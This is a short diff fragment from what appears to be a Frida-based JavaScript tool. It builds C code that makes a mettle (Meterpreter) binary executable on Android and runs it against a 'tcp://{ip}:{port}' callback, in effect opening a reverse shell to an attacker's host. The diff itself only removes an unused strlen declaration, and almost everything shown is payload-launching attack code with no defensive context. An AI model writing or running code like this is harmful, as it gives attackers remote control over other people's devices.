@@ -42,7 +42,6 @@ rpc.exports = {
 		code+="#include <stdlib.h>\n";
 		code+="#include <gum/guminterceptor.h>\n";
 		code+="extern int system (const char * m);\n";
-		code+="extern int strlen (const char * m);\n";
 		code+="int main(int a, int b) { \n";
 		code+="system(\"/system/bin/chmod +x "+mettle_droid_path+"\");\n";
 		code+="int u = system (\""+mettle_droid_path+" -b 1 -u tcp://{ip}:{port}\");\n"
